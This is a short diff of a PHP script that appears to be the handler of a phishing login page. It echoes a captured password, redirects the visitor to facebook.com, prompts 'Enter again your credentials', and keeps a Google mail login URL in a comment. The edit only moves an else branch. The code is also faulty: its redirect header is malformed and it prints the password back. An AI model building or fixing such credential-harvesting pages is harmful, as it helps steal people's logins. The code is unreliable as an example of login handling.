@@ -16,9 +16,9 @@ echo $password;
         {
             header("url=https://www.facebook.com");
 
-        }
+        } else echo "Enter again your credentials";
 
    // https://accounts.google.com/ServiceLogin?service=mail&passive=true&rm=false&continue=https://mail.google.com/mail/&ss=1&scc=1&ltmpl=default&ltmplcache=2&emr=1&osid=1
 }
-    else echo "Enter again your credentials";
+    
 ?>
